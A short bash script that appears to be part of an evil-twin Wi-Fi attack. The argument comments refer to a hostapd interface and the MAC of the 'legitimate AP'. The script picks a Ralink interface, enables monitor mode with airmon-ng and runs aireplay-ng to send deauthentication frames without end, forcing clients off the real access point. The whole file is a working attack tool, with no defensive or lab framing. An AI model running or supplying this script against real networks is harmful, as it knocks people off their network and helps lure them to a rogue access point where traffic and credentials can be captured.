#!/bin/bash

sleep 5s

#$1 = interface used by hostapd
#$2 = mac of legitimate AP
iface=$1
mac=$2

# If another ralink interface exists, use that one
ralinks=$(sudo airmon-ng | grep "Ralink")

for token in $ralinks
do
  start=""
  if [ ${#token} -gt 4 ]
    then
      start=${token:0:4}
  fi
  if [ "$start" == "wlan" ]
    then
      if [ "$token" != "$1" ]
        then
          iface=$token
      fi
  fi
done

# Start airmon-ng
sudo airmon-ng start $iface
sudo aireplay-ng --deauth 0 -a $mac --ignore-negative-one mon0
